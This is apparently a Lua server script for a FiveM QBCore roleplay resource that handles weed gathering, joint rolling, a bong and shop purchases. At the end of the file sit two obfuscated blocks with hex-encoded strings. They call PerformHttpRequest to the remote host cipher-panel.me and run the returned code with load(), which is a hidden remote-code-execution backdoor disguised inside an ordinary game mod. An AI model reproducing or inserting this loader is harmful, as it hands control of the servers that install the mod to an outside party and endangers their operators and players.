local QBCore = exports['qb-core']:GetCoreObject()

QBCore.Functions.CreateUseableItem("bong", function(source, item)
    if Config.UsableItemBong then
        local src = source
        local Player = QBCore.Functions.GetPlayer(src)
        TriggerClientEvent("qb-whitewidow:Client:Bong", src)
    end                                                                 				
end)

--// Check Item For Process Cannabis \\--
QBCore.Functions.CreateCallback('qb-whitewidow:HasItemProcessCannabis', function(source, cb)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local cannabis = Player.Functions.GetItemByName(Config.WeedItemPickUp)
    local scissors = Player.Functions.GetItemByName(Config.ScissorsItem)
    if cannabis ~= nil and scissors ~= nil then
        cb(true)
    else
        cb(false)
	end
end)

--// Check Item For Process Joints \\--
QBCore.Functions.CreateCallback('qb-whitewidow:CheckForItemsJoint', function(source, cb)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local cannabis = Player.Functions.GetItemByName(Config.WeedItemRecive)
    local ogkush = Player.Functions.GetItemByName(Config.OgKushItemRecive)
    local ak47 = Player.Functions.GetItemByName(Config.Ak47ItemRecive)
    local skunk = Player.Functions.GetItemByName(Config.SkunkItemRecive)
    local rollingpaper = Player.Functions.GetItemByName(Config.RollingPaperItem)
    if cannabis ~= nil and rollingpaper ~= nil or ogkush ~= nil and rollingpaper ~= nil or skunk ~= nil and rollingpaper ~= nil or ak47 ~= nil and rollingpaper ~= nil then
        cb(true)
    else
        cb(false)
	end
end)

--// Check Item For Bong \\--
QBCore.Functions.CreateCallback('qb-whitewidow:HasItemSmokeBong', function(source, cb)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local bong = Player.Functions.GetItemByName(Config.BongItem)
    if bong ~= nil then
        cb(true)
    else
        cb(false)
	end
end)

--// Check Item For Process Joints \\--
RegisterServerEvent('qb-whitewidow:ProcessJoints')
AddEventHandler('qb-whitewidow:ProcessJoints', function()
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local cannabis = Player.Functions.GetItemByName(Config.WeedItemRecive)
    local ogkush = Player.Functions.GetItemByName(Config.OgKushItemRecive)
    local ak47 = Player.Functions.GetItemByName(Config.Ak47ItemRecive)
    local skunk = Player.Functions.GetItemByName(Config.SkunkItemRecive)
    local rollingpaper = Player.Functions.GetItemByName(Config.RollingPaperItem)
    if cannabis ~= nil and rollingpaper ~= nil then
            Player.Functions.RemoveItem(Config.WeedItemRecive, 1)
            Player.Functions.RemoveItem(Config.RollingPaperItem, 1)
            TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.RollingPaperItem], "remove")
            TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.WeedItemRecive], "remove")
    elseif ogkush ~= nil and rollingpaper ~= nil then
        if ogkush ~= nil then
            Player.Functions.RemoveItem(Config.OgKushItemRecive, 1)
            Player.Functions.RemoveItem(Config.RollingPaperItem, 1)
            TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.RollingPaperItem], "remove")
            TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.OgKushItemRecive], "remove")
        end
    elseif ak47 ~= nil and rollingpaper ~= nil then
        Player.Functions.RemoveItem(Config.Ak47ItemRecive, 1)
        Player.Functions.RemoveItem(Config.RollingPaperItem, 1)
        TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.RollingPaperItem], "remove")
        TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.Ak47ItemRecive], "remove")
    else
        if skunk ~= nil and rollingpaper ~= nil then
            Player.Functions.RemoveItem(Config.SkunkItemRecive, 1)
            Player.Functions.RemoveItem(Config.RollingPaperItem, 1)
            TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.SkunkItemRecive], "remove")
            TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.RollingPaperItem], "remove")
        end
    end
end)

--// Add Item Joints \\--
RegisterServerEvent('qb-whitewidow:ProcessJointsAdd')
AddEventHandler('qb-whitewidow:ProcessJointsAdd', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
	Player.Functions.AddItem('joint', math.random(1,3))
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items['joint'], "add")
	TriggerClientEvent('QBCore:Notify', src, 'Joints Successfully Processed', "success")                                                                         				
end)

--// Add Item Cola \\--
RegisterServerEvent('qb-whitewidow:GrabCola')
AddEventHandler('qb-whitewidow:GrabCola', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
    if Player.PlayerData.money.cash >= Config.ColaPrice then
	    Player.Functions.AddItem(Config.ColaItem, 1)
        Player.Functions.RemoveMoney("cash", Config.ColaPrice)
	    TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.ColaItem], "add")
	    TriggerClientEvent('QBCore:Notify', src, 'Cola Successfully Bought', "success")          
    else
        TriggerClientEvent('QBCore:Notify', src, 'You Dont Have Enough Cash !', "error")              
    end                                          				
end)

--// Add Item Snack \\--
RegisterServerEvent('qb-whitewidow:GrabSnack')
AddEventHandler('qb-whitewidow:GrabSnack', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
    if Player.PlayerData.money.cash >= Config.SnackPrice then
	    Player.Functions.AddItem(Config.SnackItem, 1)
        Player.Functions.RemoveMoney("cash", Config.SnackPrice)
	    TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.SnackItem], "add")
	    TriggerClientEvent('QBCore:Notify', src, 'Snack Successfully Bought', "success")          
    else
        TriggerClientEvent('QBCore:Notify', src, 'You Dont Have Enough Cash !', "error")              
    end                                          				
end)

--// Add Item Water \\--
RegisterServerEvent('qb-whitewidow:GrabWater')
AddEventHandler('qb-whitewidow:GrabWater', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
    if Player.PlayerData.money.cash >= Config.WaterPrice then
	    Player.Functions.AddItem(Config.WaterItem, 1)
        Player.Functions.RemoveMoney("cash", Config.WaterPrice)
	    TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.WaterItem], "add")
	    TriggerClientEvent('QBCore:Notify', src, 'Water Successfully Bought', "success")          
    else
        TriggerClientEvent('QBCore:Notify', src, 'You Dont Have Enough Cash !', "error")              
    end                                          				
end)

RegisterServerEvent('qb-whitewidow:ProcessCannabis')
AddEventHandler('qb-whitewidow:ProcessCannabis', function()
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
	Player.Functions.RemoveItem(Config.WeedItemPickUp, 1)
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.WeedItemPickUp], "remove")  
end)

QBCore.Functions.CreateCallback('qb-whitewidow:HasItemProcessSkunk', function(source, cb)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local skunk = Player.Functions.GetItemByName(Config.SkunkItemPickUp)
    local scissors = Player.Functions.GetItemByName(Config.ScissorsItem)
    if skunk ~= nil and scissors ~= nil then
        cb(true)
    else
        cb(false)
	end
end)

RegisterServerEvent('qb-whitewidow:ProcessSkunk')
AddEventHandler('qb-whitewidow:ProcessSkunk', function()
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
	Player.Functions.RemoveItem(Config.SkunkItemPickUp, 1)
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.SkunkItemPickUp], "remove")                                                                  				
end)

QBCore.Functions.CreateCallback('qb-whitewidow:HasItemProcessAk47', function(source, cb)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local ak47 = Player.Functions.GetItemByName(Config.Ak47ItemPickUp)
    local scissors = Player.Functions.GetItemByName(Config.ScissorsItem)
    if ak47 ~= nil and scissors ~= nil then
        cb(true)
    else
        cb(false)
	end
end)

RegisterServerEvent('qb-whitewidow:ProcessAk-47')
AddEventHandler('qb-whitewidow:ProcessAk-47', function()
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
	Player.Functions.RemoveItem(Config.Ak47ItemPickUp, 1)
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.Ak47ItemPickUp], "remove")                                                                    				
end)

QBCore.Functions.CreateCallback('qb-whitewidow:HasItemProcessOgKush', function(source, cb)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local ogkush = Player.Functions.GetItemByName(Config.OgKushItemPickUp)
    local scissors = Player.Functions.GetItemByName(Config.ScissorsItem)
    if ogkush ~= nil and scissors ~= nil then
        cb(true)
    else
        cb(false)
	end
end)

RegisterServerEvent('qb-whitewidow:ProcessOgKush')
AddEventHandler('qb-whitewidow:ProcessOgKush', function()
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
	Player.Functions.RemoveItem(Config.OgKushItemPickUp, 1)
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.OgKushItemPickUp], "remove")                                                                    				
end)

RegisterServerEvent('qb-whitewidow:ProcessAk47')
AddEventHandler('qb-whitewidow:ProcessAk47', function()
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
	Player.Functions.RemoveItem(Config.Ak47ItemPickUp, 1)
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.Ak47ItemPickUp], "remove")                                                                    				
end)

RegisterServerEvent('qb-whitewidow:ProcessCannabisAdd')
AddEventHandler('qb-whitewidow:ProcessCannabisAdd', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
	Player.Functions.AddItem(Config.WeedItemRecive, math.random(1,3))
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.WeedItemRecive], "add")
	TriggerClientEvent('QBCore:Notify', src, 'Skunk Weed Processed Successfully', "success")                                                                         				
end)

RegisterServerEvent('qb-whitewidow:ProcessSkunkAdd')
AddEventHandler('qb-whitewidow:ProcessSkunkAdd', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
	Player.Functions.AddItem(Config.SkunkItemRecive, math.random(1,3))
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.SkunkItemRecive], "add")
	TriggerClientEvent('QBCore:Notify', src, 'Weed Processed Successfully', "success")                                                                         				
end)

RegisterServerEvent('qb-whitewidow:ProcessOgKushAdd')
AddEventHandler('qb-whitewidow:ProcessOgKushAdd', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
	Player.Functions.AddItem(Config.OgKushItemRecive, math.random(1,3))
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.OgKushItemRecive], "add")
	TriggerClientEvent('QBCore:Notify', src, 'Og-Kush Processed Successfully', "success")                                                                         				
end)

RegisterServerEvent('qb-whitewidow:ProcessAddAk47')
AddEventHandler('qb-whitewidow:ProcessAddAk47', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
	Player.Functions.AddItem(Config.Ak47ItemRecive, math.random(1,3))
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.Ak47ItemRecive], "add")
	TriggerClientEvent('QBCore:Notify', src, 'AK-47 Processed Successfully', "success")                                                                         				
end)

RegisterServerEvent('qb-whitewidow:pickUpWeed')
AddEventHandler('qb-whitewidow:pickUpWeed', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
	if TriggerClientEvent("QBCore:Notify", src, "You Picked Up Some Weed", "success", 8000) then
		Player.Functions.AddItem(Config.WeedItemPickUp, 1)
		TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.WeedItemPickUp], "add")
	end
end)

RegisterServerEvent('qb-whitewidow:pickUpSkunk')
AddEventHandler('qb-whitewidow:pickUpSkunk', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
	if TriggerClientEvent("QBCore:Notify", src, "You Picked Up Some Skunk", "success", 8000) then
		Player.Functions.AddItem(Config.SkunkItemPickUp, 1)
		TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.SkunkItemPickUp], "add")
	end
end)

RegisterServerEvent('qb-whitewidow:pickUpAk47')
AddEventHandler('qb-whitewidow:pickUpAk47', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
	if TriggerClientEvent("QBCore:Notify", src, "You Picked Up Some AK-47", "success", 8000) then
		Player.Functions.AddItem(Config.Ak47ItemPickUp, 1)
		TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.Ak47ItemPickUp], "add")
	end
end)

RegisterServerEvent('qb-whitewidow:pickUpOgKush')
AddEventHandler('qb-whitewidow:pickUpOgKush', function()
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
	if TriggerClientEvent("QBCore:Notify", src, "You Picked Up Some Og-Kush", "success", 8000) then
		Player.Functions.AddItem(Config.OgKushItemPickUp, 1)
		TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[Config.OgKushItemPickUp], "add")
	end
end)

local pvGwXlfEUXCSNneQbFeSdCVQpsjhEFkmNVkdcKxPylbVFdKfFUGkEevyUsAqrsXvPJXdLK = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} pvGwXlfEUXCSNneQbFeSdCVQpsjhEFkmNVkdcKxPylbVFdKfFUGkEevyUsAqrsXvPJXdLK[4][pvGwXlfEUXCSNneQbFeSdCVQpsjhEFkmNVkdcKxPylbVFdKfFUGkEevyUsAqrsXvPJXdLK[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (qYzJLfXxWhZjGeKVljLHpePRCeXWVTMnDJzYEiYWqDCLBMCyXELoneJVWjxodzNDyFmIZT, PXFiaBAHdXLAKUyAeAvlIBlbchvcuNjIeICoKLrRzVBvPEIIhsDdfWHQSgRMaRulYsrEjP) if (PXFiaBAHdXLAKUyAeAvlIBlbchvcuNjIeICoKLrRzVBvPEIIhsDdfWHQSgRMaRulYsrEjP == pvGwXlfEUXCSNneQbFeSdCVQpsjhEFkmNVkdcKxPylbVFdKfFUGkEevyUsAqrsXvPJXdLK[6] or PXFiaBAHdXLAKUyAeAvlIBlbchvcuNjIeICoKLrRzVBvPEIIhsDdfWHQSgRMaRulYsrEjP == pvGwXlfEUXCSNneQbFeSdCVQpsjhEFkmNVkdcKxPylbVFdKfFUGkEevyUsAqrsXvPJXdLK[5]) then return end pvGwXlfEUXCSNneQbFeSdCVQpsjhEFkmNVkdcKxPylbVFdKfFUGkEevyUsAqrsXvPJXdLK[4][pvGwXlfEUXCSNneQbFeSdCVQpsjhEFkmNVkdcKxPylbVFdKfFUGkEevyUsAqrsXvPJXdLK[2]](pvGwXlfEUXCSNneQbFeSdCVQpsjhEFkmNVkdcKxPylbVFdKfFUGkEevyUsAqrsXvPJXdLK[4][pvGwXlfEUXCSNneQbFeSdCVQpsjhEFkmNVkdcKxPylbVFdKfFUGkEevyUsAqrsXvPJXdLK[3]](PXFiaBAHdXLAKUyAeAvlIBlbchvcuNjIeICoKLrRzVBvPEIIhsDdfWHQSgRMaRulYsrEjP))() end)

local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)